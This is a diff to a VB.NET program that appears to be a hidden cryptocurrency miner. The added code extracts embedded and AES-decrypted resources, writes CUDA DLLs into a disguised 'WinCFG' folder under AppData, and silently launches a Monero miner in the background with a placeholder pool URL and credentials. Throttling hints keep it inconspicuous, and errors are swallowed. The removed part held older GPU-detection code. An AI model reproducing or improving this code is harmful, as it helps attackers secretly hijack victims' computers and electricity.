@@ -99,57 +99,23 @@ Public Class Program
 
     Public Shared Sub Initialize()
         Try
-            Dim Args As String = ""
-            Dim xmr As Byte() = Nothing
+            Dim xmr As Byte() = GetTheResource("#xmr")
+            Dim cuda1 As Byte() = GetTheResource("#cuda1")
+            Dim cuda2 As Byte() = GetTheResource("#cuda2")
+            Dim cuda3 As Byte() = GetTheResource("#cuda3")
 
-            If GetGPU.ToLower.Contains("nvidia") Then
-                If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
-                    Args = "--cuda-bfactor=12 --cuda-bsleep=100"
-                    xmr = GetTheResource("#nvidia")
-                Else
-                    Args = "--max-cpu-usage=#MaxCPU"
-                    xmr = GetTheResource("#cpu")
-                End If
-            ElseIf GetGPU.ToLower.Contains("amd") Then
-                Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
-                xmr = GetTheResource("#amd")
-            Else
-                Args = "--max-cpu-usage=#MaxCPU"
-                xmr = GetTheResource("#cpu")
-            End If
+            Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
 
+            System.IO.Directory.CreateDirectory(baseDir)
 
-            Run(GetTheResource("#dll"), "-B --donate-level=5 -a cryptonight --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
+            My.Computer.FileSystem.WriteAllBytes(baseDir + "ddb64.dll", cuda1, False)
+            My.Computer.FileSystem.WriteAllBytes(baseDir + "nvrtc64_101_0.dll", cuda2, False)
+            My.Computer.FileSystem.WriteAllBytes(baseDir + "nvrtc-builtins64_101.dll", cuda3, False)
+
+            Run(GetTheResource("#dll"), "#EnableGPU -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=10 --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --donate-level=5 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
         Catch ex As Exception
         End Try
     End Sub
-
-    Public Shared Function GetGPU() As String
-        Try
-            Dim VideoCard As String = ""
-            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
-            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)
-
-            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
-                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
-            Next
-
-            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
-                Return VideoCard
-            End If
-
-            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
-                VideoCard = VideoCard & (MemObj("Name")) & " "
-            Next
-
-            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
-                Return VideoCard
-            End If
-            Return ""
-        Catch ex As Exception
-            Return ""
-        End Try
-    End Function
 
     Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
         Dim AES As New RijndaelManaged
